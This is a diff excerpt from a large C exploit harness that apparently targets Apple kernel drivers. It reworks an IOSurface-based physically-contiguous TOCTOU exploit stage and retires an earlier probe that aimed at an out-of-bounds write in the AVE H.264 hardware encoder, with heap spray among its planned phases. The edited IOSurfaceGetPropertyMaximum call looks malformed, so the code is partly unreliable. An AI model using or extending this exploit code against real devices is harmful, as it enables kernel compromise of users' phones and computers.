@@ -17719,8 +17719,7 @@ static void r473_exploit(void) {
     mach_port_t large_entry = IOSurfaceCreateMachPort(large_surf);
     rlog("    large: %d pages, entry=0x%x, phys_contig=%d\n",
          R473_LARGE_PG, large_entry,
-         IOSurfaceGetPropertyMaximum(large_surf,
-             CFSTR("IOSurfaceIsPhysicallyContiguous")));
+         IOSurfaceGetPropertyMaximum(kIOSurfaceIsPhysicallyContiguous));
 
     /* Phase 2: Create SMALL IOSurface (1 page, 16K) */
     rlog("\n  --- Phase 2: Small IOSurface (%d page) ---\n", R473_SMALL_PG);
@@ -18260,21 +18259,9 @@ static void *r471_osc_thread(void *arg) {
     return NULL;
 }
 
-/* ============================================================
- * r473: AVEVideoEncoder Resolution OOB probe
- *
- * Tests CVE-2026-112705 / CVE-2026-112689 trigger path:
- * H.264 VTCompressionSession at large resolutions, BGRA pixel
- * buffer without IOSurface backing.  We probe multiple resolutions
- * to find the OOB boundary — where the hardware encoder's DMA
- * write exceeds the allocated buffer — without immediately
- * triggering a DART page-fault panic.
- *
- * Phase A: Safe baseline (small res) — confirm encode works
- * Phase B: Resolution sweep — find max safe / min crash boundary
- * Phase C: IOKit AVE2 user client enumeration
- * Phase D: Attempt controlled OOB with heap spray
- * ============================================================ */
+/* Old r473 removed — replaced by asymmetric PHYS_CONTIG TOCTOU above.
+ * The following r473_ave_encode_cb / r473_try_encode are dead code,
+ * kept only to avoid renumbering r474/r475 helpers. */
 static void r473_ave_encode_cb(void *ctx, void *src, OSStatus st,
                                 VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
     int *done = (int *)ctx;
@@ -18379,8 +18366,8 @@ static int r473_try_encode(int width, int height, int codec_h264, int use_iosurf
     return (int)st;
 }
 
-static void r473_exploit(void) {
-    rlog("\n=== r473: AVEVideoEncoder Resolution OOB Probe ===\n");
+static void r473_exploit_old_dead(void) {
+    rlog("\n=== r473_OLD: AVEVideoEncoder Resolution OOB Probe (DEAD) ===\n");
     rlog("Target: CVE-2026-112705/112689 (OOB write in AVE H.264 encoder)\n");
     rlog("Technique: Large-resolution H.264 encode with BGRA pixel buffer\n\n");
     fflush(stdout);
